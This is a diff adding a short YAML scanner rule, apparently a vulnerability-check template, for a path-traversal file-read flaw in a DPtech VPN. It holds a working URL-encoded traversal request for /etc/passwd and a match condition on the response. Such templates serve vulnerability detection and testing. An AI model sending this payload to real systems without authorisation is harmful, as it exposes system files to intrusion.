@@ -1,0 +1,7 @@
+cve-id: dp-dptech-vpn-fileread
+rules:
+- method: GET
+  path: /..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+  expression: 'response.status == 200 && response.body.bcontains(b"root") '
+severity: high
+type: fileread
